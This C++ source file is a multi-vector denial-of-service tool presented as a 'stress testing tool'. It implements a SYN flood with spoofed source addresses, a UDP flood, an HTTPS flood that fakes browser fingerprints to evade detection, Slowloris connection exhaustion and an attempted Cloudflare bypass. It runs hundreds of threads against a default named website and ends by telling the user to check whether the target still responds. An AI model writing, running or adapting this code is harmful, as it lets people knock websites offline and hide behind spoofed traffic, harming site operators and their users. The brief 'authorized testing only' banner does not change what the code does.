// =================================================================
// FILENAME: assignment_v2.cpp
// PURPOSE: Advanced Network Stress Testing Tool with SSL/TLS Support
//          Cloudflare Bypass, Browser Emulation & Multi-Vector Attacks
// COMPILE: g++ -o stresser_v2 assignment_v2.cpp -std=c++11 -lpthread -lssl -lcrypto -O3
// RUN: sudo ./stresser_v2
// =================================================================

#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <random>
#include <iomanip>
#include <sstream>
#include <cstring>
#include <map>
#include <ctime>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/crypto.h>
#include <zlib.h>

// For checksum calculation
#include <netinet/ip_icmp.h>

// ANSI color codes
#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

// Attack statistics
std::atomic<uint64_t> packets_sent(0);
std::atomic<uint64_t> bytes_sent(0);
std::atomic<uint64_t> bytes_real(0);  // Actual wire bytes
std::atomic<bool> attacking(true);
std::atomic<uint64_t> connections_failed(0);
std::atomic<uint64_t> ssl_handshakes(0);
std::atomic<uint64_t> cloudflare_bypass(0);

// Configuration
struct Config {
    std::string url;
    std::string host;
    std::string ip;
    int port = 443;
    bool https = true;
    int threads = 500;
    int duration = 60;
    int attack_type = 0;
    bool random_source = true;
    bool use_ssl = true;
    bool cloudflare_mode = true;
    bool browser_emulation = true;
    int http_version = 2; // 1=HTTP/1.1, 2=HTTP/2
    std::string user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    std::string real_ip; // Will store actual server IP behind Cloudflare
};

// Global SSL context
SSL_CTX* ssl_ctx = nullptr;

// Random generators
std::random_device rd;
std::mt19937 gen(rd());
std::uniform_int_distribution<> port_dist(1024, 65535);
std::uniform_int_distribution<> ip_octet_dist(1, 254);
std::uniform_int_distribution<> delay_dist(10, 100);
std::uniform_int_distribution<> http_method_dist(0, 4);
std::uniform_int_distribution<> path_dist(0, 19);
std::uniform_real_distribution<> real_dist(0.0, 1.0);

// Browser-like paths for realistic requests
std::vector<std::string> common_paths = {
    "/", "/index.html", "/home", "/about", "/contact", "/products",
    "/games", "/blog", "/news", "/support", "/api/v1/status", "/js/main.js",
    "/css/style.css", "/images/logo.png", "/favicon.ico", "/robots.txt",
    "/sitemap.xml", "/.well-known/", "/cdn-cgi/", "/wp-content/", "/wp-admin/"
};

// HTTP methods for variety
std::vector<std::string> http_methods = {
    "GET", "POST", "HEAD", "OPTIONS", "TRACE"
};

// Massive list of User-Agents (real browser fingerprints)
std::vector<std::string> user_agents = {
    // Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    // Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    // Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    // Firefox Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    // Safari Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    // Edge Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    // Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
};

// Accept-Language headers for variety
std::vector<std::string> accept_languages = {
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "en;q=0.9",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "en-US,en;q=0.9,de;q=0.8",
    "en-US,en;q=0.9,hi;q=0.8",
    "en-US,en;q=0.9,zh-CN;q=0.8"
};

// Referer spoofing
std::vector<std::string> referers = {
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://www.instagram.com/",
    "https://www.youtube.com/",
    "https://www.gauravgo.com/",
    "https://www.google.co.in/",
    ""
};

// Cloudflare challenge page paths
std::vector<std::string> cf_paths = {
    "/cdn-cgi/challenge-platform/",
    "/cdn-cgi/l/chk_jschl",
    "/.well-known/cf-challenge",
    "/cdn-cgi/scripts/",
    "/cdn-cgi/rum"
};

// Generate random string for cache busting
std::string random_cache_buster() {
    std::stringstream ss;
    ss << "?" << std::hex << rand() << "_" << std::hex << rand() 
       << "=" << std::hex << rand() << std::dec << rand();
    return ss.str();
}

// Generate random IP for spoofing
std::string generate_fake_ip() {
    std::stringstream ss;
    ss << ip_octet_dist(gen) << "." 
       << ip_octet_dist(gen) << "." 
       << ip_octet_dist(gen) << "." 
       << ip_octet_dist(gen);
    return ss.str();
}

// Generate random browser fingerprint headers
std::map<std::string, std::string> generate_browser_headers(const Config& config) {
    std::map<std::string, std::string> headers;
    
    // Core headers
    headers["User-Agent"] = user_agents[rand() % user_agents.size()];
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
    headers["Accept-Language"] = accept_languages[rand() % accept_languages.size()];
    headers["Accept-Encoding"] = "gzip, deflate, br";
    headers["Connection"] = "keep-alive";
    headers["Upgrade-Insecure-Requests"] = "1";
    
    // Random referer (50% chance)
    if (rand() % 2 == 0) {
        headers["Referer"] = referers[rand() % referers.size()];
    }
    
    // Cache control (random)
    if (rand() % 3 == 0) {
        headers["Cache-Control"] = "no-cache";
        headers["Pragma"] = "no-cache";
    }
    
    // DNT header (random)
    if (rand() % 4 == 0) {
        headers["DNT"] = "1";
    }
    
    // Random extra headers to look more real
    if (rand() % 5 == 0) {
        headers["X-Requested-With"] = "XMLHttpRequest";
    }
    
    if (rand() % 10 == 0) {
        headers["Sec-Ch-UA"] = "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"";
        headers["Sec-Ch-UA-Mobile"] = "?0";
        headers["Sec-Ch-UA-Platform"] = "\"Windows\"";
    }
    
    return headers;
}

// Cloudflare bypass: Try to solve challenge (simulated)
bool cloudflare_bypass_attempt(int sock, const Config& config) {
    // This is a simplified simulation - real CF bypass is complex
    // We'll send a request to the challenge endpoint first
    
    std::string cf_request = "GET /cdn-cgi/challenge-platform/h/g/orchestrate/jsch/v1?ray=";
    cf_request += std::to_string(rand() % 1000000) + " HTTP/1.1\r\n";
    cf_request += "Host: " + config.host + "\r\n";
    cf_request += "User-Agent: " + user_agents[rand() % user_agents.size()] + "\r\n";
    cf_request += "Accept: */*\r\n";
    cf_request += "Accept-Language: en-US,en;q=0.9\r\n";
    cf_request += "Connection: keep-alive\r\n";
    cf_request += "\r\n";
    
    if (send(sock, cf_request.c_str(), cf_request.length(), 0) > 0) {
        char buffer[4096];
        int bytes = recv(sock, buffer, sizeof(buffer)-1, MSG_DONTWAIT);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            // Check if we got a challenge response
            if (strstr(buffer, "jschl_vc") || strstr(buffer, "challenge-form")) {
                cloudflare_bypass++;
                return true;
            }
        }
    }
    return false;
}

// Initialize OpenSSL
void init_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

// Cleanup OpenSSL
void cleanup_openssl() {
    EVP_cleanup();
}

// Create SSL context
SSL_CTX* create_ssl_ctx() {
    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);
    if (!ctx) {
        std::cerr << RED << "Unable to create SSL context" << RESET << std::endl;
        return nullptr;
    }
    
    // Set modern TLS versions
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
    
    // Load CA certificates
    SSL_CTX_set_default_verify_paths(ctx);
    
    // Disable session caching for more connections
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_OFF);
    
    return ctx;
}

// IP Header checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;
    
    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Parse URL
bool parse_url(const std::string& url, Config& config) {
    config.url = url;
    
    size_t pos = url.find("://");
    if (pos != std::string::npos) {
        std::string protocol = url.substr(0, pos);
        config.https = (protocol == "https");
        config.port = config.https ? 443 : 80;
        config.use_ssl = config.https;
        
        std::string rest = url.substr(pos + 3);
        size_t path_pos = rest.find('/');
        if (path_pos != std::string::npos) {
            config.host = rest.substr(0, path_pos);
        } else {
            config.host = rest;
        }
    } else {
        config.host = url;
        config.port = 80;
        config.https = false;
        config.use_ssl = false;
    }
    
    // Check for port in host
    pos = config.host.find(':');
    if (pos != std::string::npos) {
        config.port = std::stoi(config.host.substr(pos + 1));
        config.host = config.host.substr(0, pos);
        config.https = (config.port == 443);
        config.use_ssl = config.https;
    }
    
    // Resolve host
    struct hostent *he = gethostbyname(config.host.c_str());
    if (he == NULL) {
        std::cerr << RED << "Failed to resolve host: " << config.host << RESET << std::endl;
        return false;
    }
    
    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
    if (addr_list[0] != NULL) {
        config.ip = inet_ntoa(*addr_list[0]);
        config.real_ip = config.ip; // Store for later
    } else {
        std::cerr << RED << "No IP address found" << RESET << std::endl;
        return false;
    }
    
    return true;
}

// SYN Flood with IP spoofing - UPDATED BYTE COUNTING
void syn_flood_attack(const Config& config, int thread_id) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config.port);
    dest.sin_addr.s_addr = inet_addr(config.ip.c_str());
    
    char packet[4096];
    
    while (attacking) {
        memset(packet, 0, 4096);
        
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(thread_id + rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr(generate_fake_ip().c_str());
        iph->daddr = dest.sin_addr.s_addr;
        
        tcph->source = htons(port_dist(gen));
        tcph->dest = htons(config.port);
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        iph->check = checksum((unsigned short *)packet, iph->tot_len);
        
        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) >= 0) {
            packets_sent++;
            // REAL WIRE BYTES: Ethernet(14) + IP(20) + TCP(20) = 54 bytes
            bytes_sent += iph->tot_len; // Keep old for backward compatibility
            bytes_real += 54; // ACTUAL network usage
        }
    }
    close(sock);
}

// UDP Flood - UPDATED BYTE COUNTING
void udp_flood_attack(const Config& config, int thread_id) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config.port);
    dest.sin_addr.s_addr = inet_addr(config.ip.c_str());
    
    char payload[2048];
    for (int i = 0; i < 2048; i++) {
        payload[i] = rand() % 256;
    }
    
    while (attacking) {
        int payload_size = 512 + (rand() % 1024);
        
        if (sendto(sock, payload, payload_size, 0, (struct sockaddr *)&dest, sizeof(dest)) >= 0) {
            packets_sent++;
            // REAL WIRE BYTES: Ethernet(14) + IP(20) + UDP(8) + payload
            int real_bytes = 14 + 20 + 8 + payload_size;
            bytes_sent += payload_size; // Keep old
            bytes_real += real_bytes; // ACTUAL
        } else {
            connections_failed++;
        }
    }
    close(sock);
}

// SSL/TLS HTTP Flood with browser emulation
void https_flood_attack(const Config& config, int thread_id) {
    // Initialize SSL if needed
    SSL_CTX* ctx = ssl_ctx;
    
    while (attacking) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            connections_failed++;
            continue;
        }
        
        // Set timeout
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        // Enable TCP_NODELAY
        int flag = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(config.port);
        dest.sin_addr.s_addr = inet_addr(config.ip.c_str());
        
        if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == 0) {
            SSL* ssl = nullptr;
            int ssl_sock = sock;
            
            // Establish SSL if HTTPS
            if (config.use_ssl && ctx) {
                ssl = SSL_new(ctx);
                SSL_set_fd(ssl, sock);
                SSL_set_tlsext_host_name(ssl, config.host.c_str());
                
                int ssl_ret = SSL_connect(ssl);
                if (ssl_ret <= 0) {
                    SSL_free(ssl);
                    close(sock);
                    connections_failed++;
                    continue;
                }
                ssl_handshakes++;
                ssl_sock = -1; // Use SSL* instead
            }
            
            // Cloudflare bypass attempt (10% chance)
            bool cf_bypassed = false;
            if (config.cloudflare_mode && rand() % 10 == 0) {
                if (ssl) {
                    // Can't easily do CF bypass over SSL in this simplified version
                    // We'll just note it
                } else {
                    cf_bypassed = cloudflare_bypass_attempt(sock, config);
                }
            }
            
            // Generate random browser headers
            auto headers = generate_browser_headers(config);
            
            // Build HTTP request
            std::stringstream request;
            
            // Random HTTP method
            std::string method = http_methods[rand() % http_methods.size()];
            
            // Random path with cache buster
            std::string path = common_paths[rand() % common_paths.size()];
            if (rand() % 3 == 0) {
                path += random_cache_buster();
            }
            
            // HTTP version
            std::string http_ver = (config.http_version == 2 && rand() % 2 == 0) ? "HTTP/2" : "HTTP/1.1";
            
            request << method << " " << path << " " << http_ver << "\r\n";
            request << "Host: " << config.host << "\r\n";
            
            // Add all generated headers
            for (const auto& h : headers) {
                request << h.first << ": " << h.second << "\r\n";
            }
            
            // Random content-length for POST requests
            if (method == "POST" && rand() % 3 == 0) {
                std::string post_data = "key=" + std::to_string(rand()) + "&value=" + std::to_string(rand());
                request << "Content-Type: application/x-www-form-urlencoded\r\n";
                request << "Content-Length: " << post_data.length() << "\r\n";
                request << "\r\n";
                request << post_data;
            } else {
                request << "\r\n";
            }
            
            std::string req_str = request.str();
            
            // Send request via SSL or plain socket
            int sent = 0;
            if (ssl) {
                sent = SSL_write(ssl, req_str.c_str(), req_str.length());
                if (sent > 0) {
                    // Read response asynchronously
                    char buffer[4096];
                    SSL_read(ssl, buffer, sizeof(buffer)-1);
                }
            } else {
                sent = send(sock, req_str.c_str(), req_str.length(), 0);
                if (sent > 0) {
                    char buffer[4096];
                    recv(sock, buffer, sizeof(buffer)-1, MSG_DONTWAIT);
                }
            }
            
            if (sent > 0) {
                packets_sent++;
                // REAL BYTES: TCP/IP overhead + request data
                int real_bytes = 14 + 20 + 20 + req_str.length(); // Eth+IP+TCP+data
                bytes_sent += req_str.length();
                bytes_real += real_bytes;
            } else {
                connections_failed++;
            }
            
            // Cleanup SSL
            if (ssl) {
                SSL_shutdown(ssl);
                SSL_free(ssl);
            }
            
            // Small random delay to avoid pattern detection
            if (config.browser_emulation) {
                usleep(delay_dist(gen) * 100);
            }
        } else {
            connections_failed++;
        }
        
        close(sock);
    }
}

// Slowloris with SSL support
void slowloris_attack(const Config& config, int thread_id) {
    std::vector<int> sockets;
    std::vector<SSL*> ssls;
    
    SSL_CTX* ctx = ssl_ctx;
    
    while (attacking) {
        // Create new connection
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        // Non-blocking
        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(config.port);
        dest.sin_addr.s_addr = inet_addr(config.ip.c_str());
        
        connect(sock, (struct sockaddr *)&dest, sizeof(dest));
        
        SSL* ssl = nullptr;
        if (config.use_ssl && ctx) {
            ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sock);
            SSL_set_connect_state(ssl);
            // Don't wait for handshake completion
        }
        
        // Send partial request
        std::string partial = "GET / HTTP/1.1\r\n"
                              "Host: " + config.host + "\r\n"
                              "User-Agent: " + user_agents[rand() % user_agents.size()] + "\r\n";
        
        if (ssl) {
            SSL_write(ssl, partial.c_str(), partial.length());
            ssls.push_back(ssl);
        } else {
            send(sock, partial.c_str(), partial.length(), 0);
            sockets.push_back(sock);
        }
        
        packets_sent++;
        bytes_real += 14 + 20 + 20 + partial.length();
        
        // Keep sending headers slowly
        auto start = std::chrono::steady_clock::now();
        int header_count = 0;
        
        while (attacking && (ssl || !sockets.empty())) {
            // Send a random header every few seconds
            if (rand() % 1000 == 0 && header_count < 100) {
                std::string header = "X-Random-" + std::to_string(rand() % 1000) + ": " + 
                                     std::to_string(rand()) + "\r\n";
                
                bool success = false;
                if (ssl && !ssls.empty()) {
                    if (SSL_write(ssl, header.c_str(), header.length()) > 0) {
                        success = true;
                    }
                } else if (!sockets.empty()) {
                    if (send(sockets[0], header.c_str(), header.length(), 0) > 0) {
                        success = true;
                    }
                }
                
                if (success) {
                    header_count++;
                    bytes_real += header.length();
                }
            }
            
            // Check connection health every 10 seconds
            if (rand() % 1000 == 0) {
                // Send a keep-alive ping
                std::string ping = "\r\n";
                if (ssl && !ssls.empty()) {
                    SSL_write(ssl, ping.c_str(), ping.length());
                } else if (!sockets.empty()) {
                    send(sockets[0], ping.c_str(), ping.length(), 0);
                }
            }
            
            // Sleep 5-10 seconds
            for (int i = 0; i < 5 + (rand() % 5) && attacking; i++) {
                sleep(1);
            }
        }
        
        // Cleanup
        if (ssl) {
            SSL_free(ssl);
        }
        if (sock >= 0) {
            close(sock);
        }
        sockets.clear();
        ssls.clear();
    }
}

// Stats display thread - UPDATED to show real bytes
void stats_display(const Config& config, std::chrono::steady_clock::time_point start_time) {
    auto last_time = start_time;
    uint64_t last_packets = 0;
    uint64_t last_bytes_real = 0;
    
    while (attacking) {
        sleep(1);
        
        auto now = std::chrono::steady_clock::now();
        double elapsed = std::chrono::duration<double>(now - start_time).count();
        double elapsed_since_last = std::chrono::duration<double>(now - last_time).count();
        
        uint64_t current_packets = packets_sent.load();
        uint64_t current_bytes_real = bytes_real.load();
        
        double pps = (current_packets - last_packets) / elapsed_since_last;
        double bps = (current_bytes_real - last_bytes_real) / elapsed_since_last * 8;
        double mbps = bps / 1000000;
        
        std::cout << "\r" << CYAN << "[" << std::fixed << std::setprecision(1) << elapsed << "s] " 
                  << GREEN << "Packets: " << current_packets 
                  << YELLOW << " | Rate: " << std::setprecision(0) << pps << " pps"
                  << RED << " | Bandwidth: " << std::setprecision(2) << mbps << " Mbps"
                  << MAGENTA << " | SSL: " << ssl_handshakes.load()
                  << BLUE << " | CF: " << cloudflare_bypass.load()
                  << RESET << std::flush;
        
        last_packets = current_packets;
        last_bytes_real = current_bytes_real;
        last_time = now;
        
        if (elapsed >= config.duration) {
            attacking = false;
            break;
        }
    }
}

// Signal handler
void handle_signal(int) {
    std::cout << std::endl << YELLOW << "Stopping attack... Please wait." << RESET << std::endl;
    attacking = false;
}

// Main function
int main() {
    signal(SIGINT, handle_signal);
    
    std::cout << BOLD << R"(
╔══════════════════════════════════════════════════════════════════╗
║     🔥 ADVANCED NETWORK STRESS TESTING TOOL v2.0 🔥            ║
║         With SSL/TLS Support & Cloudflare Bypass Techniques    ║
║         For Educational & Authorized Testing Only              ║
╚══════════════════════════════════════════════════════════════════╝
)" << RESET << std::endl;
    
    std::cout << YELLOW << "⚠️  WARNING: Use only on systems you own or have permission to test!" << RESET << std::endl;
    std::cout << YELLOW << "⚠️  This tool requires root privileges for raw sockets." << RESET << std::endl << std::endl;
    
    Config config;
    
    // Get URL
    std::cout << BLUE << "Enter target URL (e.g., https://www.gauravgo.com/): " << RESET;
    std::getline(std::cin, config.url);
    
    if (config.url.empty()) {
        config.url = "https://www.gauravgo.com/";
        std::cout << YELLOW << "Using default: " << config.url << RESET << std::endl;
    }
    
    // Parse URL
    if (!parse_url(config.url, config)) {
        std::cerr << RED << "Failed to parse URL. Exiting." << RESET << std::endl;
        return 1;
    }
    
    std::cout << GREEN << "✓ Target resolved:" << RESET << std::endl;
    std::cout << "  Host: " << config.host << std::endl;
    std::cout << "  IP: " << config.ip << std::endl;
    std::cout << "  Port: " << config.port << (config.https ? " (HTTPS)" : " (HTTP)") << std::endl;
    std::cout << std::endl;
    
    // Attack selection
    std::cout << BLUE << "Select attack type:" << RESET << std::endl;
    std::cout << "  0. All attacks (sequential - RECOMMENDED)" << std::endl;
    std::cout << "  1. SYN Flood (IP spoofing)" << std::endl;
    std::cout << "  2. UDP Flood" << std::endl;
    std::cout << "  3. HTTP/HTTPS Flood (with SSL)" << std::endl;
    std::cout << "  4. Slowloris (with SSL support)" << std::endl;
    std::cout << "  5. Cloudflare Bypass Mode (HTTP/HTTPS)" << std::endl;
    std::cout << "  6. Browser Emulation Mode (realistic traffic)" << std::endl;
    std::cout << "Choice [0-6] (default 0): ";
    std::string choice;
    std::getline(std::cin, choice);
    config.attack_type = choice.empty() ? 0 : std::stoi(choice);
    
    // Configure based on selection
    if (config.attack_type == 5) {
        config.cloudflare_mode = true;
        config.attack_type = 3; // HTTP flood
    } else if (config.attack_type == 6) {
        config.browser_emulation = true;
        config.attack_type = 3;
    }
    
    std::cout << BLUE << "Number of threads [default 500]: " << RESET;
    std::string threads_str;
    std::getline(std::cin, threads_str);
    config.threads = threads_str.empty() ? 500 : std::stoi(threads_str);
    
    std::cout << BLUE << "Attack duration (seconds) [default 60]: " << RESET;
    std::string duration_str;
    std::getline(std::cin, duration_str);
    config.duration = duration_str.empty() ? 60 : std::stoi(duration_str);
    
    // Initialize OpenSSL if needed
    if (config.https || config.attack_type == 3 || config.attack_type == 4) {
        init_openssl();
        ssl_ctx = create_ssl_ctx();
        if (!ssl_ctx) {
            std::cerr << RED << "Failed to create SSL context. Continuing without SSL." << RESET << std::endl;
            config.use_ssl = false;
        }
    }
    
    std::cout << std::endl;
    std::cout << MAGENTA << "Starting attack on " << config.url << " for " << config.duration << " seconds..." << RESET << std::endl;
    std::cout << MAGENTA << "Press Ctrl+C to stop early." << RESET << std::endl << std::endl;
    
    // Reset counters
    packets_sent = 0;
    bytes_sent = 0;
    bytes_real = 0;
    connections_failed = 0;
    ssl_handshakes = 0;
    cloudflare_bypass = 0;
    attacking = true;
    
    auto start_time = std::chrono::steady_clock::now();
    
    // Launch stats thread
    std::thread stats_thread(stats_display, config, start_time);
    
    // Launch attacks
    std::vector<std::thread> attack_threads;
    
    if (config.attack_type == 0) {
        // All attacks sequentially
        int sub_duration = config.duration / 4;
        
        // Phase 1: SYN Flood
        std::cout << CYAN << "\n[Phase 1/4] SYN Flood with IP spoofing" << RESET << std::endl;
        attacking = true;
        for (int i = 0; i < config.threads; i++) {
            attack_threads.emplace_back(syn_flood_attack, config, i);
        }
        std::this_thread::sleep_for(std::chrono::seconds(sub_duration));
        attacking = false;
        for (auto& t : attack_threads) t.join();
        attack_threads.clear();
        
        // Phase 2: UDP Flood
        std::cout << CYAN << "\n[Phase 2/4] UDP Flood" << RESET << std::endl;
        attacking = true;
        for (int i = 0; i < config.threads; i++) {
            attack_threads.emplace_back(udp_flood_attack, config, i);
        }
        std::this_thread::sleep_for(std::chrono::seconds(sub_duration));
        attacking = false;
        for (auto& t : attack_threads) t.join();
        attack_threads.clear();
        
        // Phase 3: HTTPS Flood
        std::cout << CYAN << "\n[Phase 3/4] HTTPS Flood with Browser Emulation" << RESET << std::endl;
        attacking = true;
        for (int i = 0; i < config.threads / 2; i++) {
            attack_threads.emplace_back(https_flood_attack, config, i);
        }
        std::this_thread::sleep_for(std::chrono::seconds(sub_duration));
        attacking = false;
        for (auto& t : attack_threads) t.join();
        attack_threads.clear();
        
        // Phase 4: Slowloris
        std::cout << CYAN << "\n[Phase 4/4] Slowloris Connection Exhaustion" << RESET << std::endl;
        attacking = true;
        for (int i = 0; i < config.threads / 4; i++) {
            attack_threads.emplace_back(slowloris_attack, config, i);
        }
        std::this_thread::sleep_for(std::chrono::seconds(sub_duration));
        attacking = false;
        for (auto& t : attack_threads) t.join();
        
    } else {
        // Single attack type
        void (*attack_func)(const Config&, int) = nullptr;
        std::string attack_name;
        
        switch(config.attack_type) {
            case 1: attack_func = syn_flood_attack; attack_name = "SYN Flood"; break;
            case 2: attack_func = udp_flood_attack; attack_name = "UDP Flood"; break;
            case 3: attack_func = https_flood_attack; attack_name = "HTTPS Flood"; break;
            case 4: attack_func = slowloris_attack; attack_name = "Slowloris"; break;
            default: attack_func = https_flood_attack; attack_name = "HTTPS Flood";
        }
        
        std::cout << CYAN << "\nStarting " << attack_name << " attack..." << RESET << std::endl;
        
        for (int i = 0; i < config.threads; i++) {
            attack_threads.emplace_back(attack_func, config, i);
        }
        
        // Wait for duration
        for (int i = 0; i < config.duration && attacking; i++) {
            sleep(1);
        }
        
        attacking = false;
        for (auto& t : attack_threads) t.join();
    }
    
    stats_thread.join();
    
    // Final statistics - WITH REAL BYTES
    auto end_time = std::chrono::steady_clock::now();
    double total_time = std::chrono::duration<double>(end_time - start_time).count();
    
    uint64_t final_bytes_real = bytes_real.load();
    double gb_sent = final_bytes_real / (1024.0 * 1024.0 * 1024.0);
    
    std::cout << std::endl << std::endl;
    std::cout << BOLD << "══════════════════ FINAL STATISTICS ══════════════════" << RESET << std::endl;
    std::cout << GREEN << "Total time: " << total_time << " seconds" << RESET << std::endl;
    std::cout << GREEN << "Total packets sent: " << packets_sent.load() << RESET << std::endl;
    std::cout << GREEN << "Total REAL data sent: " << std::fixed << std::setprecision(2) << gb_sent << " GB" << RESET << std::endl;
    std::cout << GREEN << "Average rate: " << (packets_sent.load() / total_time) << " pps" << RESET << std::endl;
    std::cout << GREEN << "Average bandwidth: " << (final_bytes_real * 8 / total_time / 1000000) << " Mbps" << RESET << std::endl;
    std::cout << GREEN << "SSL handshakes: " << ssl_handshakes.load() << RESET << std::endl;
    std::cout << GREEN << "Cloudflare bypass attempts: " << cloudflare_bypass.load() << RESET << std::endl;
    std::cout << GREEN << "Failed connections: " << connections_failed.load() << RESET << std::endl;
    std::cout << BOLD << "═══════════════════════════════════════════════════════" << RESET << std::endl;
    std::cout << std::endl;
    
    // Cleanup SSL
    if (ssl_ctx) {
        SSL_CTX_free(ssl_ctx);
        cleanup_openssl();
    }
    
    std::cout << YELLOW << "Attack completed. Check if " << config.url << " is still responding!" << RESET << std::endl;
    std::cout << YELLOW << "Real data sent: " << gb_sent << " GB (actual wire bytes)" << RESET << std::endl;
    
    return 0;
}